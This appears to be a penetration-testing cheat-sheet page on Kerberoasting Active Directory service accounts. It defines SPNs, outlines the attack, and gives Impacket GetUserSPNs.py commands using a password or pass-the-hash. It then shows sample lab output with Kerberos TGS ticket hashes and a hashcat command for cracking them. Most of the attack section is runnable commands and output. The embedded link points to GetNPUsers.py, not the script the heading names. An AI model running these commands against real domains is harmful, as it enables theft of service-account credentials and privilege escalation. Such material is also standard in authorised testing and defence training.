# Kerberoasting - SPN

## SPN

> A service principal name (SPN) is the name by which a **Kerberos client uniquely identifies an instance of a service** for a given Kerberos target computer.&#x20;
>
> If you install multiple instances of a service on computers throughout a forest, **each instance must have its own SPN**. A given service instance can have multiple SPNs if there are multiple names that clients might use for authentication. For example, an SPN always includes the name of the host computer on which the service instance is running, so a service instance might register an SPN for each name or alias of its host.

## Kerberoasting

So what's this attack all about :

* An attacker **scans** Active Directory for **user accounts with SPN values set** using any number of methods, including PowerShell and LDAP queries, scripts provided by the Kerberoast toolkit, or tools like PowerSploit, Bloodhound ..
* Once a list of target accounts is obtained, **the attacker requests service tickets** from AD using SPN values
* Using **MimiKatz** or **GetSPN.py**, the attacker then extracts the service tickets to memory and saves the information to a file
* Once the tickets are saved to disk, the attacker passes them into a **password cracking** script that will run a dictionary of passwords as NTLM hashes against the service tickets they have extracted until it can successfully open the ticket. When the ticket is finally opened, it’ll be presented to the attacker in clear text.

### `Impacket-GetUserSPNs`

{% embed url="https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetNPUsers.py" %}

```bash
GetUserSPNs.py $domain_name/$username:$password -dc-ip $ip -request

# if we have hashes
GetUserSPNs.py -dc-ip $ip -hashes f220d3988deb3f516c73f40ee16c431d:f220d3988deb3f516c73f40ee16c431d -outputfile output.txt $domain_name/$username


# output should give :
ServicePrincipalName                Name        MemberOf                                              PasswordLastSet
----------------------------------  ----------  ----------------------------------------------------  -------------------
http/win10.sittingduck.info         uberuser    CN=Domain Admins,CN=Users,DC=sittingduck,DC=info  2015-11-10 23:47:21
MSSQLSvc/WIN2K8R2.sittingduck.info  sqladmin01                                                        2016-05-13 19:13:20

$krb5tgs$23$*sqladmin01$SITTINGDUCK.INFO$SPN*$6e5307df490c6e3339f613fdc5655785$80ba233b4d24531202f2e354c99e7eda807bde7aeeb48ee4cdb6bf809d78652413699e3cff8b9b78b9ee70e997a538155fc7f72e208d715020d458b8413d4b12b212738833c4694d84937d65cb8ecd0020c00a5d39c07da35a748ea2cb062fca4fa9b282e7046d70ee1cae4cfee7d6f791052e283
$krb5tgs$23$*uberuser$SITTINGDUCK.INFO$SPN*$27c08ed2a8d5394f66e8c13c25c98393$310b787ec5c10b20fcc0acb1406b6a6e2ffddd71de3dc4c70c19e5dfcf262cc88574e61cb3940ebfd574b2bb555f2b05f84d8526e3cf46fc0ca57e03467729757cbf79da9f55cde9dabdda68e80dce6564e9f1b904b0585dbc813b82abf89e973e41c102b664f4c649f85acaf7904a273dddcb9315a66f27334f313190e1caf4f5055b671d250f5912cc1871a1dd4a6126087ddfb98ade8f7dde495ee8ad76583aa5a12eef63a690dd82a15eaaca0d7594f2f1dbc899035d89dd628b291590058cfb3405d1dfe4a383be5704465d9c8972ef8f1cba3541fdfa7dcf5063eaed74051fa18bd73f7b4f7d77

# copy the tickets hashes to file and crack them
hashcat -m 13100 tickets_file dict_file -O
```
